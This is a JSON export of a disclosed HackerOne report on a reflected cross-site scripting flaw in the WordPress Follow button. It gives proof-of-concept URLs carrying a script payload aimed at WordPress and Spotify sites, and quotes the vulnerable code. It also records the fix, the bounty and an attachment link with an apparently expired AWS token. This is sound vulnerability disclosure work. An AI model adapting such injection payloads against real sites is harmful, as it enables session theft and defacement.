{"id":172574,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI1NzQ=","url":"https://hackerone.com/reports/172574","title":"Follow Button XSS","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-09-28T07:06:46.944Z","submitted_at":"2016-09-28T07:06:46.944Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-10-28T12:44:46.991Z","bug_reporter_agreed_on_going_public_at":"2016-09-28T12:44:36.928Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**PoC**\n1) Open link\n2) Click \"Follow\" in the bottom right-hand corner\n\nXSS Should work on any wordpress site with this Follow button. \nfbd.isLoggedIn must be equal to false.\n\n```\nhttps://apps.wordpress.com/support/\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\nhttps://labs.spotify.com/\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\nhttps://news.spotify.com/tr/\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\n```\n\n**Vulnerable Code**\napps.wordpress.com\n```html\n\u003cscript type='text/javascript'\u003e\n/* \u003c![CDATA[ */\nvar actionbardata = {\n...\n\"subscribeNonce\":\"\u003cinput type=\\\"hidden\\\" id=\\\"_wpnonce\\\" name=\\\"_wpnonce\\\" value=\\\"9dca8606d3\\\" \\/\u003e\u003cinput type=\\\"hidden\\\" name=\\\"_wp_http_referer\\\" \nvalue=\\\"\\/support\\/\\\"\u003e\u003cscript\u003ealert(document.domain)\u003c\\/script\u003e\\\" \\/\u003e\",\n\"referer\":\"https:\\/\\/apps.wordpress.com\\/support\\/\\\"\u003e\u003cscript\u003ealert(document.domain)\u003c\\/script\u003e\",\n\"canFollow\":\"1\"\n...\n\u003c/script\u003e\n```\n\ns2.wp.com/_static/\n```js\n\t// Follow Site\n\t$actionbar.on(  'click', '.actnbr-actn-follow', function(e) {\n\t\te.preventDefault();\n\n\t\tif ( fbd.isLoggedIn ) {\n\t\t\tshowActionBarStatusMessage( '\u003cdiv class=\"actnbr-reader\"\u003e' + fbd.i18n.followedText + '\u003c/div\u003e' );\n\t\t\tbumpStat( 'followed' );\n\t\t\trequest( 'ab_subscribe_to_blog' );\n\t\t} else {\n\t\t\tshowActionBarFollowForm();\n\t\t}\n\t} )\n\t...\n\t\tfunction showActionBarFollowForm() {\n\t\tvar btn = $( '#actionbar .actnbr-btn' );\n\t\tbtn.toggleClass( 'actnbr-hidden' );\n\n\t\t$( '#actionbar .actnbr-follow-bubble' ).html( ' \\\n\t\t\t...\n\t\t\t\u003cinput type=\"hidden\" name=\"blog_id\" value=\"' + fbd.siteID + '\"/\u003e \\\n\t\t\t\u003cinput type=\"hidden\" name=\"source\" value=\"' + fbd.referer + '\"/\u003e \\\n\t\t\t\u003cinput type=\"hidden\" name=\"sub-type\" value=\"actionbar-follow\"/\u003e \\\n\t\t\t' + fbd.subscribeNonce + ' \\\n\t\t\t...\n\t\t');\n```\n\n\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":123569,"file_name":"Screenshot_at_11-06-11.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/123/569/fdbbdc916fc00525ffde81f7acf3d2a96037b10f/Screenshot_at_11-06-11.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_11-06-11.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_11-06-11.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSK4WOTH5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135144Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDjst9aCdbYiLIMwr9Ch8DTQvtbqAq2PUTmVxrtmvThtAIgSEwpNKIplIEtz5xxnkJ1cS4PAKNsqIRPh%2BdjbNa6kNkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDKoloRrogbt9MrbINirXAweStit7tRbKldWmv5m56905qopCrhiIh0afa7BbXcyddiE1lVP3qkUzFkFARwrvCPxZZcK6znBAwkJeuq4ZLJKAiz3SE6Bbgz0dPuj5RcfBoLhQs58tlPQozqAXbn12Pem3I6YCouzl5yxAPj18pgpKNG9x0obczWpKTFqenMNS%2FDu29u%2FUXKeLdJ2YkbDJ3XC8il3DY%2BsF0AQK%2BTcpJmDkP%2FR6Dwfqj8V5nzSLB1B1Q6QKWpALdT%2FIkMCDfVSozDYYuJ%2B9d368wBuia6V19rrqP4dim%2Fn5rdZQAZGoaXUkXaah9AFHE0FSAuyZ8IZeejx3%2FdcPvRQe2Mtynd1G9IzsNxTMmMeNREOTl067S0zwh4y7t8KilEdNjQSMknLg5rIXLbexXIllu28cawyKmB%2B0EFLEWmIzIHF2qPobRuriHSz5yTIi7gEF8vXtLa4QXkyCv7CLN5Vxr%2FhBcUOJ0mor%2B1EH7PiNAJNHD7L9d3BsThsGtjiy5YJnYdjvpFzOy8Ro05N%2Bwb5lzjttxXZnLYahE5ZQL1WRoFq8GjlpDi49lPqx%2FKlTMF1sdKJQqPZ5DnOj8NpjT2u%2FvGPKmmbRTmrjR%2Btw5ZOX8amRb2qEQ0GO8SLbSeik7jDz8JCLBjqlAcqviimSgTUYofaoYwBX9mq7VXP5cwJTSm6hfLkG0QxpfImbjAzvJqxMzJa1M8izlVHsrcenCg4EcO8k%2BRgMmYj9Fwc9z6RJPYBR%2B1XesfAaFfpOmWU87WZPC%2B3JgE%2BYkn7oq3crPoupd2DALi7dIoYlyYw0rG3eP95a6C3LPyMxHWbXCufcqViLnI3Eh6pXDyFdYoSymtaB29TlNwveUgEvmnpZ0w%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d4450f2fdcd1947a3e18119e6dfd419f2178e363c46d869ab93c778499cbd1f0","file_size":40493,"type":"image/png"}],"allow_singular_disclosure_at":"2016-10-28T12:44:37.043Z","allow_singular_disclosure_after":-156301627.56098008,"singular_disclosure_allowed":true,"vote_count":12,"voters":["bobrov","spam404","samincube","w2w","xsam","sumit7","spetr0x","ov3rflow1","scept1c","dyabla","and 2 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1220804,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi. Thanks for the report. We confirmed the problem which affected logged out users only. We deployed a patch that should fix the issue you reported. Can you please confirm?","automated_response":false,"created_at":"2016-09-28T09:30:07.254Z","updated_at":"2016-09-28T09:30:07.254Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1220817,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, the vulnerability fixed.","automated_response":false,"created_at":"2016-09-28T09:46:38.983Z","updated_at":"2016-09-28T09:46:38.983Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1221024,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-09-28T12:32:05.266Z","updated_at":"2016-09-28T12:32:05.266Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1221027,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-09-28T12:38:40.702Z","updated_at":"2016-09-28T12:38:40.702Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"bobrov","url":"/bobrov"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1221034,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-09-28T12:44:36.982Z","updated_at":"2016-09-28T12:44:36.982Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1272757,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-10-28T12:44:47.007Z","updated_at":"2016-10-28T12:44:47.007Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}